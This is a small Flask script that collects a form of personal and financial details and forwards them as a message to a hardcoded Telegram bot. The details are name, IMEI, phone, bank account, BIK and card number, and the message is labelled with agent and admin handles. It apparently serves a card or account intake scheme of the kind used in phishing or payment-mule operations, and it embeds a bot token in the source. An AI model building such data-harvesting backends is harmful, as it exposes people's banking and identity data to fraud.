from flask import Flask, request, render_template
import requests

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = '7498464182:AAFLg-D0LSJ-5PVRlD-AfOmQPFZC8GKpOKc'
TELEGRAM_CHAT_ID = '6656971536'

@app.route('/')
def form():
    return render_template('form.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.form.to_dict()
    message = (
        f"Агент: @yan_pay\n"
        f"Админ в чате: @helper_kong\n"
        f"№ Чата: {data['chat_number']}\n"
        f"ID: {data['id']}\n"
        f"ФИО: {data['name']}\n"
        f"Владелец ID: {data['owner_id']}\n"
        f"IMEI: {data['imei']}\n"
        f"Телефон: {data['phone']}\n"
        f"Лимит доверия, руб: {data['trust_limit']}\n"
        f"Комментарии: {data['comments']}\n"
        f"🏦1️⃣\n"
        f"Банк: {data['bank']}\n"
        f"Счет 1: {data['account1']}\n"
        f"БИК 1: {data['bik1']}\n"
        f"💳\n"
        f"Карта 1: {data['card1']}\n"
    )
    
    requests.post(
        f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
        data={'chat_id': TELEGRAM_CHAT_ID, 'text': message}
    )
    
    return 'Анкета отправлена!'

if __name__ == '__main__':
    app.run(debug=True)
